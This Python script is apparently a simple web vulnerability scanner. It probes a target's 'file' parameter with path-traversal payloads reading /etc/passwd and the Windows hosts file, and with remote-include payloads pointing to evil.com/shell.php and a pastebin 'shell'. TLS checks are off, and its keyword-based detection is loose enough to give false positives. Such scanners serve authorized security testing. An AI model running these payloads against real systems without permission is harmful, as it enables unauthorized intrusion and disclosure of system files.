import requests
from colorama import Fore, Style, init

init(autoreset=True)

def lfi_rfi_scan(target, verbose=False):
    print(Fore.CYAN + "[LFI/RFI SCAN STARTED]")
    
    # Add schema if missing
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0'})
    session.verify = False

    lfi_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd",
        "C:\\windows\\system32\\drivers\\etc\\hosts"
    ]

    rfi_payloads = [
        "http://evil.com/shell.php",
        "https://pastebin.com/raw/shell"
    ]

    vuln_found = False

    for payload in lfi_payloads + rfi_payloads:
        try:
            url = f"{target.rstrip('/')}?file={payload}"
            response = session.get(url, timeout=5)
            if "root:" in response.text or "passwd" in response.text or "shell" in response.text:
                vuln_type = "LFI" if payload in lfi_payloads else "RFI"
                print(Fore.RED + f"[{vuln_type} VULN] {url}")
                vuln_found = True
        except Exception as e:
            if verbose:
                print(Fore.YELLOW + f"[INFO] {url} - {e}")

    if not vuln_found:
        print(Fore.GREEN + "[LFI/RFI] No vulnerabilities found")
    print(Fore.CYAN + "[LFI/RFI SCAN COMPLETED]")